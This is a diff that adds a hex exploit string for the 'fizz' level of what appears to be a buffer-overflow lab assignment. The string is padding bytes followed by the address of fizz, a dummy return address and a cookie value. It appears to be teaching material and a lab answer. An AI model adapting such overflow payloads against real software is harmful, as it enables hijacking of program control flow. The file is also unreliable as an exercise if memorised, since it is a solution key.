@@ -1,0 +1,11 @@
+/* exploit string for fizz */
+00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00
+/* address of fizz */
+ba 8c 04 08
+/* return address of fizz */
+00 00 00 00
+/* Cookie */
+ac f8 4d 7f
